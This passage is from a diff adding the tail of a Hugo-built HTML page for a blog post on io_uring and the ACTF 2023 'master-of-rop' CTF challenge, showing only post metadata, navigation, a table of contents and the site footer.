+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Updated on 2025-08-23 14:03:41">Updated on 2025-08-23&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/io_uring/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="vscode://file/D:%5cBlog%5ccontent%5cposts%5cio_uring.md" title="Open in editor" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/phppwn_re_struct/" class="post-nav-item" rel="prev" title="Phppwn逆向"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Phppwn逆向</a><a href="/posts/cpp_pwn/" class="post-nav-item" rel="next" title="C&#43;&#43;pwn之异常处理">C&#43;&#43;pwn之异常处理<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#基础知识">基础知识</a>
+      <ul>
+        <li><a href="#io_uring_setup"><code>io_uring_setup</code></a></li>
+        <li><a href="#io_uring_enter"><code>io_uring_enter</code></a></li>
+        <li><a href="#模板">模板</a></li>
+        <li><a href="#liburing">liburing</a></li>
+      </ul>
+    </li>
+    <li><a href="#actf-2023-master-of-rop">ACTF 2023 master-of-rop</a>
+      <ul>
+        <li><a href="#确定内核版本">确定内核版本</a></li>
+        <li><a href="#寻找代替系统调用">寻找代替系统调用</a></li>
+        <li><a href="#实现">实现</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.154.3"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.2-20260109063229-50d27e0e"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">J4f</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
+              <circle class="bg" cx="50" cy="50" r="50"></circle>
+              <circle class="progress" cx="50" cy="50" r="50"></circle>
+            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/js/config/ebaeeee772c6590c6351860ce640b5aa.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
